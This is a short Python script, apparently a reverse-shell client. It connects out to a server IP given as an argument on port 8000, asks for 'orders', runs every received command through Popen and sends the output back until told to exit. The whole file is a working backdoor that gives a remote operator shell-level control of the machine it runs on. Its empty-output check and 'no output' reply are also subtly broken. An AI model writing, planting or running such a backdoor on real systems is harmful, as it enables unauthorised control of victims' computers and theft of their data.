import sys
from subprocess import Popen, PIPE
from socket import *

def setup():
    # server specifics
    server_ip = sys.argv[1]
    server_port = 8000

    server_socket = socket(AF_INET, SOCK_STREAM)
    server_socket.connect((server_ip, server_port))

    # encode for byte stream
    server_socket.send("Hello, give me some orders".encode())

    return server_socket

def run_commands(command_socket):

    command = (command_socket.recv(4064)).decode()
    while command != "exit":

        print("running: " + command)

        # run the command (shell command) and pipe output/errors to this process 
        proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
        # result = stdout, err = stderr
        result, err = proc.communicate()
        print("sending: " + result.decode())

        if result == '':
            command_socket.send('no output')
        else:
            command_socket.send(result)

        command = (command_socket.recv(4064)).decode()


run_commands(setup())